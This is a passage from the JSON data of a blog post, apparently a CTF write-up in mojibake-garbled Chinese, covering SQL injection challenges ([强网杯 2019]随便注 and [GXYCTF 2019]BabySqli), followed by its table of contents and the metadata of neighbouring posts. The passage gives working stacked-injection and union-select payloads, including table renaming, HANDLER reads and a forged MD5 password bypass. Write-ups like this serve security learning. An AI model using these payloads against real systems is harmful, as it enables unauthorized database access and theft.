`1919810931114514`</span><br></pre></td></tr></table></figure>\n\n<p>æŸ¥è¯¢å­—æ®µå‘ç°<strong>flagåœ¨1919810931114514</strong>ä¸­</p>\n<p><strong>å³å¯åæ¨å‡º</strong>å½“å‰é¡µé¢æŸ¥è¯¢çš„æ˜¯<strong>wordsè¡¨</strong></p>\n<p>sqlè¯­å¥ä¾¿æ˜¯ <strong>select data from <code>words</code> where id &#x3D;$inject</strong></p>\n<p><strong>æ—¢ç„¶å¯ä»¥å †å æ³¨å…¥ å°†è¡¨åæ”¹åŠ¨å³å¯</strong></p>\n<p><strong>Payload:</strong></p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">rename table `words` to `ttt`;</span><br><span class=\"line\"></span><br><span class=\"line\">rename table `1919810931114514` to `words`;</span><br><span class=\"line\"></span><br><span class=\"line\">ALTER TABLE words ADD id int(10) DEFAULT &#x27;12&#x27;;</span><br><span class=\"line\"></span><br><span class=\"line\">alert table `words` change `flag` `data` varchar(100);</span><br><span class=\"line\"></span><br><span class=\"line\">show columns from `words`;</span><br></pre></td></tr></table></figure>\n\n<p>ALTER TABLE <strong>tiger (è¡¨å)</strong> CHANGE tigername(è¦ä¿®æ”¹çš„åˆ—) name (ä¿®æ”¹åçš„åˆ—å) VARCHAR(20)(ç±»å‹);</p>\n<p>æœ€åæŸ¥è¯¢ 1â€™ or â€˜1&#x3D;1</p>\n<h3 id=\"æ€è·¯ä¸‰-handlerä»£æ›¿select\"><a href=\"#æ€è·¯ä¸‰-handlerä»£æ›¿select\" class=\"headerlink\" title=\"æ€è·¯ä¸‰ handlerä»£æ›¿select\"></a>æ€è·¯ä¸‰ handlerä»£æ›¿select</h3><p><img src=\"/post/%E8%B5%9B%E9%A2%98%E6%80%BB%E7%BB%933/image-20241031165931763.png\" alt=\"image-20241031165931763\"></p>\n<p><img src=\"/post/%E8%B5%9B%E9%A2%98%E6%80%BB%E7%BB%933/image-20241031165936604.png\" alt=\"image-20241031165936604\"></p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">-1&#x27;;</span><br><span class=\"line\">handler `1919810931114514` open;</span><br><span class=\"line\">handler `1919810931114514` read first;-- +</span><br></pre></td></tr></table></figure>\n\n\n\n<h2 id=\"sqlä¸ä»£ç å®¡è®¡\"><a href=\"#sqlä¸ä»£ç å®¡è®¡\" class=\"headerlink\" title=\"sqlä¸ä»£ç å®¡è®¡\"></a>sqlä¸ä»£ç å®¡è®¡</h2><h3 id=\"GXYCTF-2019-BabySqli\"><a href=\"#GXYCTF-2019-BabySqli\" class=\"headerlink\" title=\"[GXYCTF 2019]BabySqli\"></a>[GXYCTF 2019]BabySqli</h3><p> <a href=\"https://www.nssctf.cn/problem/1093\">https://www.nssctf.cn/problem/1093</a> </p>\n<p>MMZFM422K5HDASKDN5TVU3SKOZRFGQRRMMZFM6KJJBSG6WSYJJWESSCWPJNFQSTVLFLTC3CJIQYGOSTZKJ2VSVZRNRFHOPJ5 </p>\n<p>è§£å¯†å</p>\n<p>select * from user where username &#x3D; â€˜$nameâ€™</p>\n<p>æç¤ºæˆ‘ä»¬å…ˆæ³¨å…¥<strong>ç”¨æˆ·å</strong></p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">1&#x27; union select 1,2,3 #æµ‹å‡ºå­—æ®µæ•°æ˜¯3</span><br><span class=\"line\">1&#x27; union select &#x27;admin&#x27;,2,3# åˆ¤æ–­ç”¨æˆ·æ‰€åœ¨åˆ— è¿”å›wrong user</span><br><span class=\"line\">1&#x27; union select 1,&#x27;admin&#x27;,3 #è¿”å›wrong pass</span><br></pre></td></tr></table></figure>\n\n<p>å¾—å‡ºäº†adminç”¨æˆ·åœ¨ç¬¬äºŒåˆ—</p>\n<h3 id=\"æŸ¥çœ‹æºç \"><a href=\"#æŸ¥çœ‹æºç \" class=\"headerlink\" title=\"æŸ¥çœ‹æºç \"></a>æŸ¥çœ‹æºç </h3><p>æ ¹æ®æç¤ºæŸ¥çœ‹æºç </p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">if</span>(<span class=\"variable\">$arr</span>[<span class=\"number\">1</span>] == <span class=\"string\">&quot;admin&quot;</span>)&#123;</span><br><span class=\"line\">\t\t\t<span class=\"keyword\">if</span>(<span class=\"title function_ invoke__\">md5</span>(<span class=\"variable\">$password</span>) == <span class=\"variable\">$arr</span>[<span class=\"number\">2</span>])&#123;</span><br><span class=\"line\">\t\t\t\t<span class=\"keyword\">echo</span> <span class=\"variable\">$flag</span>;</span><br><span class=\"line\">\t\t\t&#125;</span><br><span class=\"line\">\t\t\t<span class=\"keyword\">else</span>&#123;</span><br><span class=\"line\">\t\t\t\t<span class=\"keyword\">die</span>(<span class=\"string\">&quot;wrong pass!&quot;</span>);</span><br><span class=\"line\">\t\t\t&#125;</span><br><span class=\"line\">\t\t&#125;</span><br></pre></td></tr></table></figure>\n\n<p>å‘ç°æ˜¯å¯†ç è¾“å…¥æ¡†çš„å€¼è¿›è¡Œmd5åŠ å¯†è¿›è¡ŒåŒ¹é…</p>\n<h3 id=\"æµ‹è¯•å¯†ç å­—æ®µ\"><a href=\"#æµ‹è¯•å¯†ç å­—æ®µ\" class=\"headerlink\" title=\"æµ‹è¯•å¯†ç å­—æ®µ\"></a>æµ‹è¯•å¯†ç å­—æ®µ</h3><p>æ‰€ä»¥åˆ°æ­¤éœ€è¦çŒœæƒ³é‚£ä¸€ä¸ªå­—æ®µæ˜¯å¯†ç </p>\n<p>ä¸€èˆ¬æ¥è¯´ï¼Œ2æ˜¯ç”¨æˆ·ï¼Œ3å°±æ˜¯å¯†ç ï¼Œè¿›è¡Œæµ‹è¯•</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">1â€™union select 1,â€˜adminâ€™,â€˜e10adc3949ba59abbe56e057f20f883eâ€™# //ç¬¬ä¸‰ä¸ªå­—æ®µæ˜¯123456çš„MD5åŠ å¯†æ ¼å¼</span><br><span class=\"line\">123456 #å¯†ç æ¡†è¾“å…¥</span><br></pre></td></tr></table></figure>\n\n<p>è·å¾—flag</p>\n","text":"JWTä»¤ç‰Œä¼ªé€ JSON Web Token HFCTF2020 EasyLoginhttps://buuoj.cn/challenges#[HFCTF2020]...","permalink":"/post/èµ›é¢˜æ€»ç»“3","photos":[],"count_time":{"symbolsCount":"17k","symbolsTime":"15 mins."},"categories":[],"tags":[{"name":"èµ›é¢˜","slug":"èµ›é¢˜","count":3,"path":"api/tags/èµ›é¢˜.json"}],"toc":"<ol class=\"toc\"><li class=\"toc-item toc-level-1\"><a class=\"toc-link\" href=\"#JWT%E4%BB%A4%E7%89%8C%E4%BC%AA%E9%80%A0\"><span class=\"toc-text\">JWTä»¤ç‰Œä¼ªé€ </span></a><ol class=\"toc-child\"><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#JSON-Web-Token\"><span class=\"toc-text\">JSON Web Token</span></a></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#HFCTF2020-EasyLogin\"><span class=\"toc-text\">HFCTF2020 EasyLogin</span></a></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#CISCN2019-%E5%8D%8E%E5%8C%97%E8%B5%9B%E5%8C%BA-ikun\"><span class=\"toc-text\">CISCN2019 ååŒ—èµ›åŒº ikun</span></a></li></ol></li><li class=\"toc-item toc-level-1\"><a class=\"toc-link\" href=\"#RCE\"><span class=\"toc-text\">RCE</span></a><ol class=\"toc-child\"><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#%E8%BD%AF%E9%93%BE%E6%8E%A5-ln-s\"><span class=\"toc-text\">è½¯é“¾æ¥  ln -s</span></a><ol class=\"toc-child\"><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#CISCN2023-Unzip\"><span class=\"toc-text\">CISCN2023 Unzip</span></a></li><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#unzip\"><span class=\"toc-text\">unzip</span></a></li></ol></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#%E6%8D%A2%E8%A1%8C%E7%AC%A6%E7%BB%95%E8%BF%87%E6%B3%A8%E9%87%8A\"><span class=\"toc-text\">æ¢è¡Œç¬¦ç»•è¿‡æ³¨é‡Š</span></a><ol class=\"toc-child\"><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#%E7%89%A2%E7%89%A2%E8%AE%B0%E4%BD%8F%EF%BC%8C%E9%80%9D%E8%80%85%E4%B8%BA%E5%A4%A7\"><span class=\"toc-text\">ç‰¢ç‰¢è®°ä½ï¼Œé€è€…ä¸ºå¤§</span></a><ol class=\"toc-child\"><li class=\"toc-item toc-level-4\"><a class=\"toc-link\" href=\"#%E6%80%9D%E8%B7%AF%E4%B8%80-%E5%8F%8D%E5%BC%B9shell\"><span class=\"toc-text\">æ€è·¯ä¸€ åå¼¹shell</span></a></li><li class=\"toc-item toc-level-4\"><a class=\"toc-link\" href=\"#%E6%80%9D%E8%B7%AF%E4%BA%8C-%E8%BF%9C%E7%A8%8B%E4%B8%8B%E8%BD%BD%E6%9C%A8%E9%A9%AC\"><span class=\"toc-text\">æ€è·¯äºŒ è¿œç¨‹ä¸‹è½½æœ¨é©¬</span></a></li></ol></li></ol></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#%E5%85%AB%E8%BF%9B%E5%88%B6%E6%9E%84%E9%80%A0%E5%91%BD%E4%BB%A4-%E7%A7%BB%E4%BD%8D%E6%9E%84%E9%80%A0%E4%BA%8C%E8%BF%9B%E5%88%B6%E5%91%BD%E4%BB%A4\"><span class=\"toc-text\">å…«è¿›åˆ¶æ„é€ å‘½ä»¤ ç§»ä½æ„é€ äºŒè¿›åˆ¶å‘½ä»¤</span></a><ol class=\"toc-child\"><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#ezRCE\"><span class=\"toc-text\">ezRCE</span></a></li></ol></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#hex2bin%E5%87%BD%E6%95%B0%E6%9E%84%E9%80%A016%E8%BF%9B%E5%88%B6%E5%91%BD%E4%BB%A4\"><span class=\"toc-text\">hex2binå‡½æ•°æ„é€ 16è¿›åˆ¶å‘½ä»¤</span></a><ol class=\"toc-child\"><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#CISCN2024\"><span class=\"toc-text\">CISCN2024</span></a></li><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#simple-php\"><span class=\"toc-text\">simple php</span></a><ol class=\"toc-child\"><li class=\"toc-item toc-level-4\"><a class=\"toc-link\" href=\"#%E5%91%BD%E4%BB%A4%E8%A1%8C%E8%BF%90%E8%A1%8Cphp%E4%BB%A3%E7%A0%81\"><span class=\"toc-text\">å‘½ä»¤è¡Œè¿è¡Œphpä»£ç </span></a></li><li class=\"toc-item toc-level-4\"><a class=\"toc-link\" href=\"#%E6%9E%84%E9%80%A016%E8%BF%9B%E5%88%B6%E5%91%BD%E4%BB%A4\"><span class=\"toc-text\">æ„é€ 16è¿›åˆ¶å‘½ä»¤</span></a></li><li class=\"toc-item toc-level-4\"><a class=\"toc-link\" href=\"#%E8%BF%9E%E6%8E%A5%E6%95%B0%E6%8D%AE%E5%BA%93\"><span class=\"toc-text\">è¿æ¥æ•°æ®åº“</span></a></li></ol></li></ol></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#shell-exec%E6%97%A0%E5%9B%9E%E6%98%BE%E5%A4%96%E5%B8%A6\"><span class=\"toc-text\">shell_execæ— å›æ˜¾å¤–å¸¦</span></a><ol class=\"toc-child\"><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#%E5%90%AC%E4%B8%8D%E8%A7%81%E6%88%91%E7%9A%84%E5%A3%B0%E9%9F%B3\"><span class=\"toc-text\">å¬ä¸è§æˆ‘çš„å£°éŸ³</span></a></li><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#%E6%96%B9%E6%B3%95%E4%B8%80\"><span class=\"toc-text\">æ–¹æ³•ä¸€</span></a><ol class=\"toc-child\"><li class=\"toc-item toc-level-4\"><a class=\"toc-link\" href=\"#cmd-%E5%8F%8D%E5%BC%95%E5%8F%B7%E7%9A%84%E5%88%A9%E7%94%A8\"><span class=\"toc-text\">$(cmd)  åå¼•å·çš„åˆ©ç”¨</span></a></li></ol></li><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#%E6%96%B9%E6%B3%95%E4%BA%8C\"><span class=\"toc-text\">æ–¹æ³•äºŒ</span></a></li></ol></li></ol></li><li class=\"toc-item toc-level-1\"><a class=\"toc-link\" href=\"#Bypass\"><span class=\"toc-text\">Bypass</span></a><ol class=\"toc-child\"><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#sizeof-POST-%E2%80%98len%E2%80%99-sizeof-array\"><span class=\"toc-text\">sizeof($_POST[â€˜lenâ€™]) &#x3D;&#x3D; sizeof($array)</span></a><ol class=\"toc-child\"><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#basectf\"><span class=\"toc-text\">basectf</span></a></li><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#%E7%8E%A9%E5%8E%9F%E7%A5%9E%E7%8E%A9%E7%9A%84\"><span class=\"toc-text\">ç©åŸç¥ç©çš„</span></a></li><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#%E7%AC%AC%E4%B8%80%E9%83%A8%E5%88%86\"><span class=\"toc-text\">ç¬¬ä¸€éƒ¨åˆ†</span></a><ol class=\"toc-child\"><li class=\"toc-item toc-level-4\"><a class=\"toc-link\" href=\"#sizeof-POST-%E2%80%98len%E2%80%99-sizeof-array-1\"><span class=\"toc-text\">sizeof($_POST[â€˜lenâ€™]) &#x3D;&#x3D; sizeof($array)</span></a></li></ol></li><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#%E7%AC%AC%E4%BA%8C%E9%83%A8%E5%88%86\"><span class=\"toc-text\">ç¬¬äºŒéƒ¨åˆ†</span></a></li><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#%E7%AC%AC%E4%B8%89%E9%83%A8%E5%88%86\"><span class=\"toc-text\">ç¬¬ä¸‰éƒ¨åˆ†</span></a></li></ol></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#url-%E8%A7%A3%E6%9E%90%E8%A7%84%E5%88%99\"><span class=\"toc-text\">url@è§£æè§„åˆ™</span></a><ol class=\"toc-child\"><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#basectf-1\"><span class=\"toc-text\">basectf</span></a></li><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#Aura%E9%85%B1%E7%9A%84%E7%A4%BC%E7%89%A9\"><span class=\"toc-text\">Auraé…±çš„ç¤¼ç‰©</span></a></li><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#%E7%AC%AC%E4%B8%80%E9%83%A8%E5%88%86-1\"><span class=\"toc-text\">ç¬¬ä¸€éƒ¨åˆ†</span></a><ol class=\"toc-child\"><li class=\"toc-item toc-level-4\"><a class=\"toc-link\" href=\"#data-%E5%86%99%E5%85%A5\"><span class=\"toc-text\">data:&#x2F;&#x2F;å†™å…¥</span></a></li></ol></li><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#%E7%AC%AC%E4%BA%8C%E9%83%A8%E5%88%86-1\"><span class=\"toc-text\">ç¬¬äºŒéƒ¨åˆ†</span></a><ol class=\"toc-child\"><li class=\"toc-item toc-level-4\"><a class=\"toc-link\" href=\"#url-%E8%A7%A3%E6%9E%90%E8%A7%84%E5%88%99-1\"><span class=\"toc-text\">url@è§£æè§„åˆ™</span></a><ol class=\"toc-child\"><li class=\"toc-item toc-level-5\"><a class=\"toc-link\" href=\"#%E8%A7%A3%E6%B3%95%E4%B8%80\"><span class=\"toc-text\">è§£æ³•ä¸€</span></a></li><li class=\"toc-item toc-level-5\"><a class=\"toc-link\" href=\"#%E8%A7%A3%E6%B3%95%E4%BA%8C\"><span class=\"toc-text\">è§£æ³•äºŒ</span></a></li></ol></li></ol></li><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#%E6%9C%80%E7%BB%88payload\"><span class=\"toc-text\">æœ€ç»ˆpayload</span></a></li></ol></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#php%E5%8E%9F%E7%94%9F%E7%B1%BB1\"><span class=\"toc-text\">phpåŸç”Ÿç±»1</span></a><ol class=\"toc-child\"><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#basectf-2\"><span class=\"toc-text\">basectf</span></a></li><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#flag%E7%9B%B4%E6%8E%A5%E8%AF%BB%E5%8F%96%E4%B8%8D%E5%B0%B1%E8%A1%8C%E4%BA%86%EF%BC%9F\"><span class=\"toc-text\">flagç›´æ¥è¯»å–ä¸å°±è¡Œäº†ï¼Ÿ</span></a></li></ol></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#php%E5%8E%9F%E7%94%9F%E7%B1%BB2\"><span class=\"toc-text\">phpåŸç”Ÿç±»2</span></a><ol class=\"toc-child\"><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#1z-php\"><span class=\"toc-text\">1z_php</span></a></li><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#%E7%AC%AC%E4%B8%80%E9%83%A8%E5%88%86-2\"><span class=\"toc-text\">ç¬¬ä¸€éƒ¨åˆ†</span></a><ol class=\"toc-child\"><li class=\"toc-item toc-level-4\"><a class=\"toc-link\" href=\"#%E9%9D%9E%E6%B3%95%E5%AD%97%E7%AC%A6%E8%BD%AC%E5%8C%96%E8%A7%84%E5%88%99\"><span class=\"toc-text\">éæ³•å­—ç¬¦è½¬åŒ–è§„åˆ™</span></a></li><li class=\"toc-item toc-level-4\"><a class=\"toc-link\" href=\"#intval%E5%92%8Cctype-alpha%E7%BB%95%E8%BF%87\"><span class=\"toc-text\">intvalå’Œctype_alphaç»•è¿‡</span></a></li></ol></li><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#%E7%AC%AC%E4%BA%8C%E9%83%A8%E5%88%86-2\"><span class=\"toc-text\">ç¬¬äºŒéƒ¨åˆ†</span></a><ol class=\"toc-child\"><li class=\"toc-item toc-level-4\"><a class=\"toc-link\" href=\"#preg-match%E5%92%8C-stripos%E7%BB%84%E5%90%88%EF%BC%81%EF%BC%81%EF%BC%81%E9%95%BF%E5%BA%A6%E7%BB%95%E8%BF%87\"><span class=\"toc-text\">preg_matchå’Œ!striposç»„åˆï¼ï¼ï¼é•¿åº¦ç»•è¿‡</span></a></li></ol></li><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#%E7%AC%AC%E4%B8%89%E9%83%A8%E5%88%86-1\"><span class=\"toc-text\">ç¬¬ä¸‰éƒ¨åˆ†</span></a><ol class=\"toc-child\"><li class=\"toc-item toc-level-4\"><a class=\"toc-link\" href=\"#PHP%E5%8E%9F%E7%94%9F%E7%B1%BB%E4%B9%8BSplFileObject\"><span class=\"toc-text\">PHPåŸç”Ÿç±»ä¹‹SplFileObject</span></a></li></ol></li><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#EXP\"><span class=\"toc-text\">EXP</span></a></li></ol></li></ol></li><li class=\"toc-item toc-level-1\"><a class=\"toc-link\" href=\"#SQL\"><span class=\"toc-text\">SQL</span></a><ol class=\"toc-child\"><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#%E9%A2%84%E5%A4%84%E7%90%86-SQL\"><span class=\"toc-text\">é¢„å¤„ç† SQL</span></a><ol class=\"toc-child\"><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#%E5%BC%BA%E7%BD%91%E6%9D%AF-2019-%E9%9A%8F%E4%BE%BF%E6%B3%A8\"><span class=\"toc-text\">[å¼ºç½‘æ¯ 2019]éšä¾¿æ³¨</span></a></li><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#%E6%80%9D%E8%B7%AF%E4%B8%80%E9%A2%84%E5%A4%84%E7%90%86-SQL\"><span class=\"toc-text\">æ€è·¯ä¸€é¢„å¤„ç† SQL</span></a></li><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#%E6%80%9D%E8%B7%AF%E4%BA%8C-%E7%8C%9C%E6%B5%8B%E5%8E%9F%E8%AF%AD%E5%8F%A5-%E4%BF%AE%E6%94%B9%E8%A1%A8%E5%90%8D\"><span class=\"toc-text\">æ€è·¯äºŒ çŒœæµ‹åŸè¯­å¥ ä¿®æ”¹è¡¨å</span></a></li><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#%E6%80%9D%E8%B7%AF%E4%B8%89-handler%E4%BB%A3%E6%9B%BFselect\"><span class=\"toc-text\">æ€è·¯ä¸‰ handlerä»£æ›¿select</span></a></li></ol></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#sql%E4%B8%8E%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1\"><span class=\"toc-text\">sqlä¸ä»£ç å®¡è®¡</span></a><ol class=\"toc-child\"><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#GXYCTF-2019-BabySqli\"><span class=\"toc-text\">[GXYCTF 2019]BabySqli</span></a></li><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#%E6%9F%A5%E7%9C%8B%E6%BA%90%E7%A0%81\"><span class=\"toc-text\">æŸ¥çœ‹æºç </span></a></li><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#%E6%B5%8B%E8%AF%95%E5%AF%86%E7%A0%81%E5%AD%97%E6%AE%B5\"><span class=\"toc-text\">æµ‹è¯•å¯†ç å­—æ®µ</span></a></li></ol></li></ol></li></ol>","author":{"name":"Sygsdsg","slug":"blog-author","avatar":"https://img.picui.cn/free/2024/10/23/6718a2ef955e1.jpg","link":"/","description":"å˜»å˜»","socials":{"github":"https://github.com/Sygsdsg/Sygsdsg.github.io","twitter":"","stackoverflow":"","wechat":"","qq":"","weibo":"","zhihu":"","csdn":"","juejin":"","customs":{}}},"mapped":true,"hidden":false,"prev_post":{"title":"pythonåŸå‹é“¾æ±¡æŸ“","uid":"968c5d6624aab9225eba1668a49a3a02","slug":"pythonåŸå‹é“¾æ±¡æŸ“","date":"2024-11-12T12:07:29.000Z","updated":"2024-11-12T12:13:06.680Z","comments":true,"path":"api/articles/pythonåŸå‹é“¾æ±¡æŸ“.json","keywords":null,"cover":"/image/7.png","text":"pythonå˜ç§åŸå‹é“¾æ±¡æŸ“**dst.get(k)**ï¼š è¿™æ˜¯åœ¨å­—å…¸ dst ä¸­æŸ¥æ‰¾é”® k å¯¹åº”çš„å€¼ã€‚å¦‚æœé”® k å­˜åœ¨ï¼Œåˆ™è¿”å›å¯¹åº”çš„å€¼ï¼›å¦‚æœé”® k ä¸å­˜åœ¨ï¼Œåˆ™è¿”...","permalink":"/post/pythonåŸå‹é“¾æ±¡æŸ“","photos":[],"count_time":{"symbolsCount":"7.4k","symbolsTime":"7 mins."},"categories":[],"tags":[{"name":"ctf","slug":"ctf","count":7,"path":"api/tags/ctf.json"}],"author":{"name":"Sygsdsg","slug":"blog-author","avatar":"https://img.picui.cn/free/2024/10/23/6718a2ef955e1.jpg","link":"/","description":"å˜»å˜»","socials":{"github":"https://github.com/Sygsdsg/Sygsdsg.github.io","twitter":"","stackoverflow":"","wechat":"","qq":"","weibo":"","zhihu":"","csdn":"","juejin":"","customs":{}}}},"next_post":{"title":"èµ›é¢˜æ€»ç»“1","uid":"befe7ebe5c3909555effd7c815dc781c","slug":"èµ›é¢˜æ€»ç»“1","date":"2024-10-31T08:36:49.000Z","updated":"2024-10-31T08:37:27.571Z","comments":true,"path":"api/articles/èµ›é¢˜æ€»ç»“1.json","keywords":null,"cover":"/image/9.jpg","text":"https://gz.imxbt.cn/games Ctfç»éªŒåŠå…¶é¢˜ç›®æ€»ç»“l åšé¢˜ç»éªŒï¼šä¸è¦å¿½ç•¥index.php** å’ŒæŸ¥çœ‹æºä»£ç  l robots.txt ...","permalink":"/post/èµ›é¢˜æ€»ç»“1","photos":[],"count_time":{"symbolsCount":"35k","symbolsTime":"32 mins."},"categories":[],"tags":[{"name":"èµ›é¢˜","slug":"èµ›é¢˜","count":3,"path":"api/tags/èµ›é¢˜.json"}],"author":{"name":"Sygsdsg","slug":"blog-author","avatar":"https://img.picui.cn/free/2024/10/23/6718a2ef955e1.jpg","link":"/","description":"å˜»å˜»","socials":{"github":"https://github.com/Sygsdsg/Sygsdsg.github.io","twitter":"","stackoverflow":"","wechat":"","qq":"","weibo":"","zhihu":"","csdn":"","juejin":"","customs":{}}}}}